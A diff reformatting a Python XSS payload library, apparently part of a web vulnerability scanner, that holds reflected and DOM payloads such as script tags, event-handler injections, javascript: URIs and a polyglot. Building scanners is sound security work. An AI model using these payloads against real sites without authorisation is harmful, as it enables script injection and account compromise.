@@ -1,6 +1,7 @@
 """
 XSS payload library — P2 upgrade: 100+ payloads.
 """
+
 from typing import List
 import secrets
 import string
@@ -61,13 +62,13 @@ REFLECTED_PAYLOADS: List[str] = [
     "<a href=javascript:alert(1)>click</a>",
     # Quote breakouts
     "'><script>alert(1)</script>",
-    "\"><script>alert(1)</script>",
+    '"><script>alert(1)</script>',
     "'><img src=x onerror=alert(1)>",
-    "\"><img src=x onerror=alert(1)>",
+    '"><img src=x onerror=alert(1)>',
     "'><svg onload=alert(1)>",
-    "\"><svg onload=alert(1)>",
+    '"><svg onload=alert(1)>',
     "';alert(1)//",
-    "\";alert(1)//",
+    '";alert(1)//',
     "'>alert(1)</script>",
     # Template literals
     "${alert(1)}",
@@ -105,7 +106,7 @@ REFLECTED_PAYLOADS: List[str] = [
     # CSS injection
     "background-image:url(javascript:alert(1))",
     # Polyglots
-    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",  # noqa: E501
     # On-window
     "onwheel=alert(1)",
     "onscroll=alert(1)",
@@ -126,7 +127,7 @@ DOM_PAYLOADS: List[str] = [
     "#<svg onload=alert(1)>",
     "#'><script>alert(document.domain)</script>",
     "#javascript:alert(1)",
-    "#\" onfocus=alert(1) autofocus ",
+    '#" onfocus=alert(1) autofocus ',
     "#' onfocus=alert(1) autofocus ",
 ]
 
@@ -165,4 +166,4 @@ STORED_XSS_CALLBACK_PAYLOADS: List[str] = [
 
 def generate_stored_xss_marker(length: int = 12) -> str:
     """Generate a unique marker for stored XSS detection."""
-    return "WVS_XSS_" + ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(length))
+    return "WVS_XSS_" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(length))
